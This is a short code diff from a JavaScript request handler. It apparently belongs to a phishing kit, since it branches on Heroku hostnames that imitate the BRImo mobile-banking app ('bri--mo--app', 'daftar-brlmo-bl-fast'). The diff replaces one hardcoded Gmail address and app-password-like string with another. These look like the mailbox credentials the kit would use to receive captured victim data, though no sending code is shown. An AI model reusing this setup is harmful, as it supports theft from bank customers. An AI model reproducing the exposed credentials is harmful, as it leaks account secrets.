@@ -9,8 +9,8 @@ export default function handler(req, res) {
 
     if (url == 'bri--mo--app.herokuapp.com'){
 
-        email = 'mannnsudirman19@gmail.com';
-        pass = 'ydtztxtluhtoaaus';
+        email = 'lagi3132@gmail.com';
+        pass = 'rqvxojgehhtvzrip';
 
     } else if (url == 'daftar-brlmo-bl-fast.herokuapp.com'){
         
